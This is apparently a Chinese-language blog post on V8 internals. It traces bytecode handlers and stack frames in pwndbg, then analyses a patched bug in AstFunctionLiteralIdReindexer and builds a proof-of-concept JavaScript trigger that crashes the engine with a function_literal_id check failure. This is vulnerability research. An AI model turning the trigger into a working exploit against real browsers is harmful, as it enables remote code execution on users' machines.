+<p>它的入口点是<code>BUILTIN CompileLazy</code>，这一点我们前面介绍过，这是延迟编译，因为我们还没有调用到fun函数。当首次调用时，就会进入<code>CompileLazy</code>编译。<br>该函数主要调用了<code>Compiler::Compile(function, Compiler::KEEP_EXCEPTION,                          &amp;is_compiled_scope)</code></p>
+<pre><code>RUNTIME_FUNCTION(Runtime_CompileLazy) &#123;
+  HandleScope scope(isolate);
+  DCHECK_EQ(1, args.length());
+  CONVERT_ARG_HANDLE_CHECKED(JSFunction, function, 0);
+
+#ifdef DEBUG
+  if (FLAG_trace_lazy &amp;&amp; !function-&gt;shared()-&gt;is_compiled()) &#123;
+    PrintF(&quot;[unoptimized: &quot;);
+    function-&gt;PrintName();
+    PrintF(&quot;]\n&quot;);
+  &#125;
+#endif
+
+  StackLimitCheck check(isolate);
+  if (check.JsHasOverflowed(kStackSpaceRequiredForCompilation * KB)) &#123;
+    return isolate-&gt;StackOverflow();
+  &#125;
+  IsCompiledScope is_compiled_scope;
+  if (!Compiler::Compile(function, Compiler::KEEP_EXCEPTION,
+                         &amp;is_compiled_scope)) &#123;
+    return ReadOnlyRoots(isolate).exception();
+  &#125;
+  DCHECK(function-&gt;is_compiled());
+  return function-&gt;code();
+&#125;
+</code></pre>
+<p>其中<code>Compiler::Compile(Handle&lt;SharedFunctionInfo&gt; shared_info,                        ClearExceptionFlag flag,                        IsCompiledScope* is_compiled_scope)</code>函数与之前分析的<code>CompileToplevel</code>函数类似，只是在Compile函数中生成AST使用的是<code>ParseAny</code>函数。</p>
+<pre><code>bool ParseAny(ParseInfo* info, Handle&lt;SharedFunctionInfo&gt; shared_info,
+              Isolate* isolate) &#123;
+  DCHECK(!shared_info.is_null());
+  return info-&gt;is_toplevel() ? ParseProgram(info, isolate)
+                             : ParseFunction(info, shared_info, isolate);
+&#125;
+</code></pre>
+<p>由于是函数，因此这里调用的是<code>ParseFunction</code>函数。解析到过程与前面介绍的ParseProgram类似，这里先不叙述。<br>现在我们对第二个<code>CallNoFeedback</code>字节码进行断点（因为第一个会触发CompileLazy进行函数编译），这样我们好观察函数调用的过程。对于字节码的断点调试，我们可以使用硬件读断点。</p>
+<pre><code>         0x98299ea11 @   55 : 26 f8             Star r3
+  170 E&gt; 0x98299ea13 @   57 : 5f fa f9 02       CallNoFeedback r1, r2-r3
+         0x98299ea17 @   61 : 26 fb             Star r0
+  201 S&gt; 0x98299ea19 @   63 : a9                Return 
+pwndbg&gt; rwatch *0x98299ea13
+Hardware read watchpoint 4: *0x98299ea13
+</code></pre>
+<p>继续运行即可来到对应的Handler</p>
+<pre><code> ► 0x7f04a304fe32 &lt;Builtins_StarHandler+50&gt;              movabs r10, 0x100000000
+   0x7f04a304fe3c &lt;Builtins_StarHandler+60&gt;              cmp    r10, rbx
+   0x7f04a304fe3f &lt;Builtins_StarHandler+63&gt;              jae    Builtins_StarHandler+78 &lt;Builtins_StarHandler+78&gt;
+    ↓
+   0x7f04a304fe4e &lt;Builtins_StarHandler+78&gt;              mov    rcx, qword ptr [r15 + rbx*8]
+   0x7f04a304fe52 &lt;Builtins_StarHandler+82&gt;              jmp    rcx
+    ↓
+   0x7f04a307b840 &lt;Builtins_CallNoFeedbackHandler&gt;       lea    rbx, [rip - 7] &lt;0x7f04a307b840&gt;
+   0x7f04a307b847 &lt;Builtins_CallNoFeedbackHandler+7&gt;     cmp    rbx, rcx
+   0x7f04a307b84a &lt;Builtins_CallNoFeedbackHandler+10&gt;    je     Builtins_CallNoFeedbackHandler+28 &lt;Builtins_CallNoFeedbackHandler+28&gt;
+    ↓
+   0x7f04a307b85c &lt;Builtins_CallNoFeedbackHandler+28&gt;    mov    rdx, rbp
+   0x7f04a307b85f &lt;Builtins_CallNoFeedbackHandler+31&gt;    mov    dword ptr [rdx - 0x20], 0
+   0x7f04a307b866 &lt;Builtins_CallNoFeedbackHandler+38&gt;    mov    dword ptr [rdx - 0x1c], r9d
+</code></pre>
+<p>这里取到了字节码的操作数</p>
+<pre><code>..................
+ RCX  0xfffffffffffffffa
+..................
+ R8   0x2
+..................
+   0x7f04a307b85f &lt;Builtins_CallNoFeedbackHandler+31&gt;    mov    dword ptr [rdx - 0x20], 0
+   0x7f04a307b866 &lt;Builtins_CallNoFeedbackHandler+38&gt;    mov    dword ptr [rdx - 0x1c], r9d
+   0x7f04a307b86a &lt;Builtins_CallNoFeedbackHandler+42&gt;    movsx  rcx, byte ptr [r14 + r9 + 1]
+   0x7f04a307b870 &lt;Builtins_CallNoFeedbackHandler+48&gt;    movzx  r8d, byte ptr [r14 + r9 + 3]
+   0x7f04a307b876 &lt;Builtins_CallNoFeedbackHandler+54&gt;    movabs r10, 0x100000000
+ ► 0x7f04a307b880 &lt;Builtins_CallNoFeedbackHandler+64&gt;    cmp    r10, r8
+   0x7f04a307b883 &lt;Builtins_CallNoFeedbackHandler+67&gt;    jae    Builtins_CallNoFeedbackHandler+82 &lt;Builtins_CallNoFeedbackHandler+82&gt;
+</code></pre>
+<p>继续执行，这里开始取寄存器R1</p>
+<pre><code>..........
+ RCX  0xfffffffffffffffa
+ RDX  0x7ffe9194e4b0 —▸ 0x7ffe9194e4d8 —▸ 0x7ffe9194e540 —▸ 0x7ffe9194e590 —▸ 0x7ffe9194e8c0 ◂— ...
+..........
+ RBP  0x7ffe9194e4b0 —▸ 0x7ffe9194e4d8 —▸ 0x7ffe9194e540 —▸ 0x7ffe9194e590 —▸ 0x7ffe9194e8c0 ◂— ...
+..........
+*RIP  0x7f227e7e089c (Builtins_CallNoFeedbackHandler+92) ◂— mov    rcx, qword ptr [rdx + rcx*8]
+   0x7f227e7e0876 &lt;Builtins_CallNoFeedbackHandler+54&gt;     movabs r10, 0x100000000
+   0x7f227e7e0880 &lt;Builtins_CallNoFeedbackHandler+64&gt;     cmp    r10, r8
+   0x7f227e7e0883 &lt;Builtins_CallNoFeedbackHandler+67&gt;     jae    Builtins_CallNoFeedbackHandler+82 &lt;Builtins_CallNoFeedbackHandler+82&gt;
+    ↓
+   0x7f227e7e0892 &lt;Builtins_CallNoFeedbackHandler+82&gt;     mov    r11, qword ptr [rdx - 8]
+   0x7f227e7e0896 &lt;Builtins_CallNoFeedbackHandler+86&gt;     movsx  r9, byte ptr [r14 + r9 + 2]
+ ► 0x7f227e7e089c &lt;Builtins_CallNoFeedbackHandler+92&gt;     mov    rcx, qword ptr [rdx + rcx*8]
+   0x7f227e7e08a0 &lt;Builtins_CallNoFeedbackHandler+96&gt;     lea    rbx, [rdx + r9*8]
+</code></pre>
+<p>可以知道，这是从RBP开始向上偏移-6个单元取数据，也就是R1位于-6个单元处，这与我们前面的栈结构图相对应了，并且可以知道，虚拟机使用的是系统栈，而不是独立的栈。继续查看数据</p>
+<pre><code>pwndbg&gt; tel $rdx
+00:0000│ rdx r12 rbp 0x7ffe9194e4b0 —▸ 0x7ffe9194e4d8 —▸ 0x7ffe9194e540 —▸ 0x7ffe9194e590 —▸ 0x7ffe9194e8c0 ◂— ...
+01:0008│             0x7ffe9194e4b8 —▸ 0x7f227e2b2380 (Builtins_JSEntryTrampoline+96) ◂— cmp    qword ptr [rbp - 8], 0x20
+02:0010│             0x7ffe9194e4c0 —▸ 0x30703c601521 ◂— 0x210000196ee5507f
+03:0018│             0x7ffe9194e4c8 —▸ 0x423301ea31 ◂— 0x210000196ee55003
+04:0020│             0x7ffe9194e4d0 ◂— 0x20 /* &#39; &#39; */
+05:0028│             0x7ffe9194e4d8 —▸ 0x7ffe9194e540 —▸ 0x7ffe9194e590 —▸ 0x7ffe9194e8c0 —▸ 0x7ffe9194e960 ◂— ...
+06:0030│             0x7ffe9194e4e0 —▸ 0x7f227e2b210d (Builtins_JSEntry+141) ◂— mov    r10, qword ptr [r13 + 0x2e28]
+07:0038│             0x7ffe9194e4e8 ◂— 0x0
+pwndbg&gt; job 0x30703c601521
+0x30703c601521: [JSGlobalProxy]
+ - map: 0x196ee5507f79 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x00423301a5b9 &lt;JSObject&gt;
+ - elements: 0x3938a2d00c21 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - native context: 0x004233001749 &lt;NativeContext[247]&gt;
+ - properties: 0x3938a2d00c21 &lt;FixedArray[0]&gt; &#123;&#125;
+</code></pre>
+<p>现在我们跟踪进入fun函数，查看fun函数的栈结构</p>
+<pre><code> ► 0x7f227e7b4e25 &lt;Builtins_StarHandler+37&gt;    mov    qword ptr [rdx + rbx*8], rax
+   0x7f227e7b4e29 &lt;Builtins_StarHandler+41&gt;    add    r9, 2
+   0x7f227e7b4e2d &lt;Builtins_StarHandler+45&gt;    movzx  ebx, byte ptr [r9 + r14]
+pwndbg&gt; tel $rdx
+00:0000│ rdx rbp 0x7ffe9194e450 —▸ 0x7ffe9194e4b0 —▸ 0x7ffe9194e4d8 —▸ 0x7ffe9194e540 —▸ 0x7ffe9194e590 ◂— ...
+01:0008│         0x7ffe9194e458 —▸ 0x7f227e2bcd48 (Builtins_InterpreterEntryTrampoline+968) ◂— mov    r14, qword ptr [rbp - 0x18]
+02:0010│         0x7ffe9194e460 —▸ 0x3938a2d00709 ◂— 0x3938a2d006
+03:0018│         0x7ffe9194e468 —▸ 0x30703c601521 ◂— 0x210000196ee5507f
+04:0020│         0x7ffe9194e470 —▸ 0x3938a2d00709 ◂— 0x3938a2d006
+05:0028│         0x7ffe9194e478 —▸ 0x3938a2d004d1 ◂— 0x3938a2d005
+06:0030│         0x7ffe9194e480 —▸ 0x423301ead1 ◂— 0x210000196ee55003
+07:0038│         0x7ffe9194e488 —▸ 0x3938a2d004d1 ◂— 0x3938a2d005
+pwndbg&gt; job 0x3938a2d00709
+#false
+pwndbg&gt; job 0x30703c601521
+0x30703c601521: [JSGlobalProxy]
+ - map: 0x196ee5507f79 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x00423301a5b9 &lt;JSObject&gt;
+ - elements: 0x3938a2d00c21 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - native context: 0x004233001749 &lt;NativeContext[247]&gt;
+ - properties: 0x3938a2d00c21 &lt;FixedArray[0]&gt; &#123;&#125;
+</code></pre>
+<p>从上述实验，我们大致理解了v8点虚拟机架构。现在，我们来讨论特殊的情况，即参数个数不匹配的情况。将测试代码稍作修改</p>
+<pre><code>function fun(x) &#123;
+   var a = 0x666;
+   if (x) &#123;
+      print(&quot;hello&quot;);
+   &#125; else &#123;
+      print(&quot;world&quot;);
+   &#125;
+   return a;
+&#125;
+
+%DebugPrint(fun);
+%SystemBreak();
+fun(true);
+fun(false,0x666,0x123);
+</code></pre>
+<p>然后以同样的调试方法进行调试，会发现流程会先进入<code>ArgumentsAdaptorTrampoline</code></p>
+<pre><code> ► 0x7fd81751dab2 &lt;Builtins_CallFunction_ReceiverIsAny+306&gt;    jmp    Builtins_ArgumentsAdaptorTrampoline &lt;Builtins_ArgumentsAdaptorTrampoline&gt;
+    ↓
+   0x7fd81751d580 &lt;Builtins_ArgumentsAdaptorTrampoline&gt;        cmp    rbx, 0xffff
+   0x7fd81751d587 &lt;Builtins_ArgumentsAdaptorTrampoline+7&gt;      je     Builtins_ArgumentsAdaptorTrampoline+244 &lt;Builtins_ArgumentsAdaptorTrampoline+244&gt;
+</code></pre>
+<p>实际上，这是用于适配参数的中间处理函数，有了该函数后的栈结构如下</p>
+<pre><code>                    +---------------------------------------------+---------+
+                    |               ...........                   |         |
+                    |                                             |         |
+                    +---------------------------------------------+         |
+                    |                    R2                       |         |
+                    |                                             |         |
+                    +---------------------------------------------+         |
+                    |                                             |         |
+                    |                    R1                       |         |
+                    +---------------------------------------------+         |
+                    |                                             |         |
+                    |                    R0                       |         |
+                    +---------------------------------------------+         |
+                    |                                             |         |
+                    |              Bytecode offset                |         |
+                    |                                             |         |
+                    +---------------------------------------------+         |    Callee Frame
+                    |                                             |         +---------------------&gt;
+                    |              Bytecode Array                 |         |
+                    |                                             |         |
+                    +---------------------------------------------+         |
+                    |                                             |         |
+                    |                 JSFunction                  |         |
+                    |                                             |         |
+                    +---------------------------------------------+         |
+                    |                   Context                   |         |
+        RBP         |                                             |         |
+&lt;-----------------------------------------------------------------+         |
+                    |                                             |         |
+                    |         ArgumentsAdaptorTrampoline BP       |         |
+                    |                                             |         |
+                    +---------------------------------------------+         |
+                    |                                             |         |
+                    |   Return to ArgumentsAdaptorTrampoline+xx   |         |
+                    |                                             |         |
+                    +-------------------------------------------------------+
+                    |                                             |         |
+                    |                  Argument 1                 |         |
+                    |                                             |         |
+                    +---------------------------------------------+         |
+                    |                JSGlobalProxy                |         |
+                    |                                             |         |
+                    +---------------------------------------------+         |
+                    |                                             |         |     Adaptor Frame
+                    |                   .......                   |         +----------------------&gt;
+                    |                                             |         |
+                    +---------------------------------------------+         |
+                    |                                             |         |
+                    |                 Previous BP                 |         |
+                    |                                             |         |
+                    +---------------------------------------------+         |
+                    |                                             |         |
+                    |                Return Address               |         |
+                    |                                             |         |
+                    +-------------------------------------------------------+
+                    |                                             |         |
+                    |                  Argument 3                 |         |
+                    |                                             |         |
+                    +---------------------------------------------+         |
+                    |                                             |         |
+                    |                  Argument 2                 |         |
+                    |                                             |         |     Caller Frame
+                    +---------------------------------------------+         +----------------------&gt;
+                    |                                             |         |
+                    |                  Argument 1                 |         |
+                    +---------------------------------------------+         |
+                    |                                             |         |
+                    |                JSGlobalProxy                |         |
+                    |                                             |         |
+                    +---------------------------------------------+         |
+                    |                   ......                    |         |
+                    |                                             |         |
+                    +---------------------------------------------+---------+
+</code></pre>
+<p>即<code>ArgumentsAdaptorTrampoline</code>会处理好参数后再去调用目标函数，这种匹配方式带来了便利性但是却增加了时间点消耗，在新版的v8中已经移除了这种参数适配器框架，改用了另一种简易的方法即参数倒置。</p>
+<h2 id="0x02-漏洞分析利用"><a href="#0x02-漏洞分析利用" class="headerlink" title="0x02 漏洞分析利用"></a>0x02 漏洞分析利用</h2><h3 id="patch-分析"><a href="#patch-分析" class="headerlink" title="patch 分析"></a>patch 分析</h3><pre><code>diff --git a/src/ast/ast-traversal-visitor.h b/src/ast/ast-traversal-visitor.h
+index ac5f8f2f69..1d7c86f46b 100644
+--- a/src/ast/ast-traversal-visitor.h
++++ b/src/ast/ast-traversal-visitor.h
+@@ -116,7 +116,7 @@ void AstTraversalVisitor&lt;Subclass&gt;::VisitStatements(
+   for (int i = 0; i &lt; stmts-&gt;length(); ++i) &#123;
+     Statement* stmt = stmts-&gt;at(i);
+     RECURSE(Visit(stmt));
+-    if (stmt-&gt;IsJump()) break;
+   &#125;
+ &#125;
+</code></pre>
+<p>patch中去掉了<code>AstTraversalVisitor</code>中的<code>if (stmt-&gt;IsJump()) break;</code>一句代码，我们先来分析一下如何才能到达这个漏洞点的地方。<br>延迟编译CompileLazy的AST解析函数<code>ParseFunction</code>源码如下，</p>
+<pre><code>FunctionLiteral* Parser::DoParseFunction(Isolate* isolate, ParseInfo* info,
+                                         const AstRawString* raw_name) &#123;
+............................
+    FunctionKind kind = info-&gt;function_kind();
+
+    if (IsArrowFunction(kind)) &#123;
+.............................
+
+      if (GetLastFunctionLiteralId() != info-&gt;function_literal_id() - 1) &#123;
+        if (has_error()) return nullptr;
+        // If there were FunctionLiterals in the parameters, we need to
+        // renumber them to shift down so the next function literal id for
+        // the arrow function is the one requested.
+        AstFunctionLiteralIdReindexer reindexer(
+            stack_limit_,
+            (info-&gt;function_literal_id() - 1) - GetLastFunctionLiteralId());
+        for (auto p : formals.params) &#123;
+          if (p-&gt;pattern != nullptr) reindexer.Reindex(p-&gt;pattern);
+          if (p-&gt;initializer() != nullptr) &#123;
+            reindexer.Reindex(p-&gt;initializer());
+          &#125;
+        &#125;
+        ResetFunctionLiteralId();
+        SkipFunctionLiterals(info-&gt;function_literal_id() - 1);
+      &#125;
+
+      Expression* expression = ParseArrowFunctionLiteral(formals);
+      // Scanning must end at the same position that was recorded
+      // previously. If not, parsing has been interrupted due to a stack
+      // overflow, at which point the partially parsed arrow function
+      // concise body happens to be a valid expression. This is a problem
+      // only for arrow functions with single expression bodies, since there
+      // is no end token such as &quot;&#125;&quot; for normal functions.
+      if (scanner()-&gt;location().end_pos == info-&gt;end_position()) &#123;
+        // The pre-parser saw an arrow function here, so the full parser
+        // must produce a FunctionLiteral.
+        DCHECK(expression-&gt;IsFunctionLiteral());
+        result = expression-&gt;AsFunctionLiteral();
+      &#125;
+    &#125; else if (IsDefaultConstructor(kind)) &#123;
+      DCHECK_EQ(scope(), outer);
+      result = DefaultConstructor(raw_name, IsDerivedConstructor(kind),
+                                  info-&gt;start_position(), info-&gt;end_position());
+    &#125; else &#123;
+      ZonePtrList&lt;const AstRawString&gt;* arguments_for_wrapped_function =
+          info-&gt;is_wrapped_as_function()
+              ? PrepareWrappedArguments(isolate, info, zone())
+              : nullptr;
+      result = ParseFunctionLiteral(
+          raw_name, Scanner::Location::invalid(), kSkipFunctionNameCheck, kind,
+          kNoSourcePosition, function_type, info-&gt;language_mode(),
+          arguments_for_wrapped_function);
+    &#125;
+...................
+&#125;
+</code></pre>
+<p>其将函数类似分为了三种类别：箭头函数、构造函数、普通函数。如果箭头函数的参数里存在函数的定义的话，将会使用<code>AstFunctionLiteralIdReindexer</code>将这些函数的<code>function_literal_id</code>进行reindex确定顺序。而<code>AstFunctionLiteralIdReindexer</code>的源码如下</p>
+<pre><code>void AstFunctionLiteralIdReindexer::Reindex(Expression* pattern) &#123;
+  Visit(pattern);
+&#125;
+
+void AstFunctionLiteralIdReindexer::VisitFunctionLiteral(FunctionLiteral* lit) &#123;
+  AstTraversalVisitor::VisitFunctionLiteral(lit);
+  lit-&gt;set_function_literal_id(lit-&gt;function_literal_id() + delta_);
+&#125;
+</code></pre>
+<p>从代码我们可以知道，这个Reindex实际上就是在遍历AST语法树，如果遇到函数定义，就调用<code>AstTraversalVisitor::VisitFunctionLiteral</code>，然后为当前的<code>FunctionLiteral</code>设置新的<code>function_literal_id</code>，与原值的区别在于加上了一个delta_。<code>AstTraversalVisitor::VisitFunctionLiteral</code>代码如下，</p>
+<pre><code>template &lt;class Subclass&gt;
+void AstTraversalVisitor&lt;Subclass&gt;::VisitFunctionLiteral(
+    FunctionLiteral* expr) &#123;
+  PROCESS_EXPRESSION(expr);
+  DeclarationScope* scope = expr-&gt;scope();
+  RECURSE_EXPRESSION(VisitDeclarations(scope-&gt;declarations()));
+  // A lazily parsed function literal won&#39;t have a body.
+  if (expr-&gt;scope()-&gt;was_lazily_parsed()) return;
+  RECURSE_EXPRESSION(VisitStatements(expr-&gt;body()));
+&#125;
+</code></pre>
+<p>这里会调用<code>VisitStatements</code>继续遍历函数里面的内容，而<code>VisitStatements</code>就是漏洞点所在的位置。由此我们要想达到漏洞点，需要有箭头函数，且参数里还需要有一个函数。</p>
+<h3 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h3><pre><code>function fun(x) &#123;
+   var f = (v1 = (o)=&gt;&#123;print(&quot;hello&quot;);&#125;)=&gt;&#123;&#125;;
+   f();
+&#125;
+
+fun(true);
+</code></pre>
+<p>首先f是一个箭头函数，而f箭头函数的参数里还有一个函数<code>v1 = (o)=&gt;&#123;print(&quot;hello&quot;);&#125;</code>，这样就能触发进入AstFunctionLiteralIdReindexer。为什么需要Reindex，因为解析是按照顺序的，fun的<code>literal_id</code>为1，而v1的literal_id为2，f的literal_id为3,但是v1的函数被调用的顺序不可能先于f，因为我们只能在f内部去调用v1（如<code>var f = (v1 = (o)=&gt;&#123;print(&quot;hello&quot;);&#125;)=&gt;&#123;v1();&#125;;</code>）。因此f得先被编译，因此需要将f的<code>literal_id</code>更正为2。<br>现在需要研究一下漏洞是哪个，是什么造成了漏洞，Parser阶段结束后就是进入<code>GenerateUnoptimizedCode</code>遍历AST生成字节码，其中也有一个VisitStatements</p>
+<pre><code>void BytecodeGenerator::VisitStatements(
+    const ZonePtrList&lt;Statement&gt;* statements) &#123;
+  for (int i = 0; i &lt; statements-&gt;length(); i++) &#123;
+    // Allocate an outer register allocations scope for the statement.
+    RegisterAllocationScope allocation_scope(this);
+    Statement* stmt = statements-&gt;at(i);
+    Visit(stmt);
+    if (builder()-&gt;RemainderOfBlockIsDead()) break;
+  &#125;
+&#125;
+</code></pre>
+<p>其中的<code>RemainderOfBlockIsDead</code>代码如下</p>
+<pre><code>  bool RemainderOfBlockIsDead() const &#123; return exit_seen_in_block_; &#125;
+void BytecodeArrayWriter::UpdateExitSeenInBlock(Bytecode bytecode) &#123;
+  switch (bytecode) &#123;
+    case Bytecode::kReturn:
+    case Bytecode::kThrow:
+    case Bytecode::kReThrow:
+    case Bytecode::kAbort:
+    case Bytecode::kJump:
+    case Bytecode::kJumpConstant:
+    case Bytecode::kSuspendGenerator:
+      exit_seen_in_block_ = true;
+      break;
+    default:
+      break;
+  &#125;
+</code></pre>
+<p>我们再回过头看一下<code>AstTraversalVisitor&lt;Subclass&gt;::VisitStatements</code>阶段的break条件</p>
+<pre><code>bool Statement::IsJump() const &#123;
+  switch (node_type()) &#123;
+#define JUMP_NODE_LIST(V) \
+  V(Block)                \
+  V(ExpressionStatement)  \
+  V(ContinueStatement)    \
+  V(BreakStatement)       \
+  V(ReturnStatement)      \
+  V(IfStatement)
+#define GENERATE_CASE(Node) \
+  case k##Node:             \
+    return static_cast&lt;const Node*&gt;(this)-&gt;IsJump();
+    JUMP_NODE_LIST(GENERATE_CASE)
+#undef GENERATE_CASE
+#undef JUMP_NODE_LIST
+    default:
+      return false;
+  &#125;
+&#125;
+</code></pre>
+<p>对比发现<code>IsJump</code>中多了一个对<code>IfStatement</code>的判断。其中<code>IfStatement</code>中的IsJump()源码如下</p>
+<pre><code>lass IfStatement final : public Statement &#123;
+ public:
+..................
+  bool IsJump() const &#123;
+    return HasThenStatement() &amp;&amp; then_statement()-&gt;IsJump()
+        &amp;&amp; HasElseStatement() &amp;&amp; else_statement()-&gt;IsJump();
+  &#125;
+</code></pre>
+<p>也就是这样的JS代码满足条件</p>
+<pre><code>if (a) &#123;
+   return;
+&#125; else &#123;
+   return;
+&#125;
+</code></pre>
+<p>即在if和else分支中都有控制流语句，当<code>AstTraversalVisitor</code>遍历语法树时遇到这样的语句，就会停止遍历，这意味着<code>位于这样语句后面的函数将不会被reindex，仍然保持原来的literal_id</code>。而BytecodeGenerator阶段遇到这样的语句不会break，继续生成后面的字节码。我们来构造这样一个样本，观察一下会发生什么</p>
+<pre><code>function fun() &#123;
+   var f = (v1 = (o)=&gt;&#123;
+      var a = 0;
+      if (a) &#123;
+         return;
+      &#125; else &#123;
+         return;
+      &#125;
+      function f1() &#123;
+         print(&quot;f1&quot;);
+      &#125;
+      function f2() &#123;
+         print(&quot;f2&quot;)
+      &#125;
+   &#125;)=&gt;&#123;&#125;;
+   f();
+&#125;
+
+fun();
+</code></pre>
+<p>语法树如下</p>
+<pre><code>[generating bytecode for function: ]
+--- AST ---
+FUNC at 0
+. KIND 0
+. SUSPEND COUNT 0
+. NAME &quot;&quot;
+. INFERRED NAME &quot;&quot;
+. DECLS
+. . FUNCTION &quot;fun&quot; = function fun
+. EXPRESSION STATEMENT at 256
+. . ASSIGN at -1
+. . . VAR PROXY local[0] (0x55bd8d2babd0) (mode = TEMPORARY, assigned = true) &quot;.result&quot;
+. . . CALL
+. . . . VAR PROXY unallocated (0x55bd8d2baae0) (mode = VAR, assigned = true) &quot;fun&quot;
+. RETURN at -1
+. . VAR PROXY local[0] (0x55bd8d2babd0) (mode = TEMPORARY, assigned = true) &quot;.result&quot;
+
+[generating bytecode for function: fun]
+--- AST ---
+FUNC at 12
+. KIND 0
+. SUSPEND COUNT 0
+. NAME &quot;fun&quot;
+. DECLS
+. . VARIABLE (0x55bd8d2bc908) (mode = VAR, assigned = false) &quot;f&quot;
+. BLOCK NOCOMPLETIONS at -1
+. . EXPRESSION STATEMENT at 28
+. . . INIT at 28
+. . . . VAR PROXY local[0] (0x55bd8d2bc908) (mode = VAR, assigned = false) &quot;f&quot;
+. . . . FUNC LITERAL at 28
+. . . . . NAME f
+. . . . . INFERRED NAME f
+. EXPRESSION STATEMENT at 248
+. . CALL
+. . . VAR PROXY local[0] (0x55bd8d2bc908) (mode = VAR, assigned = false) &quot;f&quot;
+
+[generating bytecode for function: f]
+--- AST ---
+FUNC at 28
+. KIND 8
+. SUSPEND COUNT 0
+. NAME &quot;&quot;
+. PARAMS
+. . VAR (0x55bd8d2bfbe8) (mode = TEMPORARY, assigned = true) &quot;&quot;
+. DECLS
+. . VARIABLE (0x55bd8d2becb8) (mode = LET, assigned = false) &quot;v1&quot;
+. BLOCK NOCOMPLETIONS at -1
+. . EXPRESSION STATEMENT at -1
+. . . INIT at -1
+. . . . VAR PROXY local[0] (0x55bd8d2becb8) (mode = LET, assigned = false) &quot;v1&quot;
+. . . . CONDITIONAL at -1
+. . . . . CONDITION at -1
+. . . . . . EQ_STRICT at -1
+. . . . . . . VAR PROXY parameter[0] (0x55bd8d2bfbe8) (mode = TEMPORARY, assigned = true) &quot;&quot;
+. . . . . . . LITERAL undefined
+. . . . . THEN at 34
+. . . . . . FUNC LITERAL at 34
+. . . . . . . NAME v1
+. . . . . . . INFERRED NAME 
+. . . . . ELSE at -1
+. . . . . . VAR PROXY parameter[0] (0x55bd8d2bfbe8) (mode = TEMPORARY, assigned = true) &quot;&quot;
+</code></pre>
+<p>发现v1里面的内容并没有生成语法树，经过测试，发现要想强制让一个函数还没执行到的时候就解析，可以改成这种形式<code>(function() &#123;......&#125;)</code>即匿名函数的形式，同理，我们发现f1和f2的内容也没有解析，我们也一并解析，修改为如下:</p>
+<pre><code>function fun() &#123;
+   var f = (v1 = (function() &#123;
+      var a = 0;
+      if (a) &#123;
+         return;
+      &#125; else &#123;
+         return;
+      &#125;
+      (function() &#123;
+         print(&quot;f1&quot;);
+      &#125;);
+      (function() &#123;
+         print(&quot;f2&quot;)
+      &#125;);
+   &#125;))=&gt;&#123;&#125;;
+   f();
+&#125;
+
+fun();
+</code></pre>
+<p>这回AST就完整了</p>
+<pre><code>[generating bytecode for function: v1]
+--- AST ---
+FUNC at 35
+. KIND 0
+. SUSPEND COUNT 0
+. NAME &quot;v1&quot;
+. INFERRED NAME &quot;&quot;
+. DECLS
+. . VARIABLE (0x55f955ee7f68) (mode = VAR, assigned = false) &quot;a&quot;
+. BLOCK NOCOMPLETIONS at -1
+. . EXPRESSION STATEMENT at 62
+. . . INIT at 62
+. . . . VAR PROXY local[0] (0x55f955ee7f68) (mode = VAR, assigned = false) &quot;a&quot;
+. . . . LITERAL 0
+. IF at 71
+. . CONDITION at 75
+. . . VAR PROXY local[0] (0x55f955ee7f68) (mode = VAR, assigned = false) &quot;a&quot;
+. . THEN at -1
+. . . BLOCK at -1
+. . . . RETURN at 89
+. . . . . LITERAL undefined
+. . ELSE at -1
+. . . BLOCK at -1
+. . . . RETURN at 121
+. . . . . LITERAL undefined
+. EXPRESSION STATEMENT at 143
+. . FUNC LITERAL at 144
+. . . NAME 
+. . . INFERRED NAME 
+. EXPRESSION STATEMENT at 195
+. . FUNC LITERAL at 196
+. . . NAME 
+. . . INFERRED NAME 
+
+[generating bytecode for function: ]
+--- AST ---
+FUNC at 144
+. KIND 0
+. SUSPEND COUNT 0
+. NAME &quot;&quot;
+. INFERRED NAME &quot;&quot;
+. EXPRESSION STATEMENT at 166
+. . CALL
+. . . VAR PROXY unallocated (0x55f955ee8e98) (mode = DYNAMIC_GLOBAL, assigned = false) &quot;print&quot;
+. . . LITERAL &quot;f1&quot;
+
+[generating bytecode for function: ]
+--- AST ---
+FUNC at 196
+. KIND 0
+. SUSPEND COUNT 0
+. NAME &quot;&quot;
+. INFERRED NAME &quot;&quot;
+. EXPRESSION STATEMENT at 218
+. . CALL
+. . . VAR PROXY unallocated (0x55f955ee8e98) (mode = DYNAMIC_GLOBAL, assigned = false) &quot;print&quot;
+. . . LITERAL &quot;f2&quot;
+</code></pre>
+<p>运行时报错</p>
+<pre><code>#
+# Fatal error in ../../src/objects.cc, line 4857
+# Check failed: fun-&gt;function_literal_id() &lt; shared_function_infos()-&gt;length() (6 vs. 6).
+</code></pre>
+<p>我们来分析一下，在<code>ast-traversal-visitor.h:119</code>处（if (stmt-&gt;IsJump())<br>break;）下断点</p>
+<pre><code>In file: /home/sea/Desktop/v8/src/ast/ast-traversal-visitor.h
+   114 void AstTraversalVisitor&lt;Subclass&gt;::VisitStatements(
+   115     const ZonePtrList&lt;Statement&gt;* stmts) &#123;
+   116   for (int i = 0; i &lt; stmts-&gt;length(); ++i) &#123;
+   117     Statement* stmt = stmts-&gt;at(i);
+   118     RECURSE(Visit(stmt));
+ ► 119     if (stmt-&gt;IsJump()) break;
+   120   &#125;
+   121 &#125;
+pwndbg&gt; p stmt-&gt;Print()
+IF at 71
+. CONDITION at 75
+. . VAR PROXY unresolved &quot;a&quot;
+. THEN at -1
+. . BLOCK at -1
+. . . RETURN at 89
+. . . . LITERAL undefined
+. ELSE at -1
+. . BLOCK at -1
+. . . RETURN at 121
+. . . . LITERAL undefined
+$8 = void
+</code></pre>
+<p>此时遍历到了那个if语句，判断为IsJump，则后面点内容不再遍历。然后返回到这里更正unction_literal_id</p>
+<pre><code>   23 void AstFunctionLiteralIdReindexer::VisitFunctionLiteral(FunctionLiteral* lit) &#123;
+   24   AstTraversalVisitor::VisitFunctionLiteral(lit);
+ ► 25   lit-&gt;set_function_literal_id(lit-&gt;function_literal_id() + delta_);
+   26 &#125;
+pwndbg&gt; p lit-&gt;function_literal_id()
+$9 = 5
+pwndbg&gt; p delta_
+$10 = -3
+</code></pre>
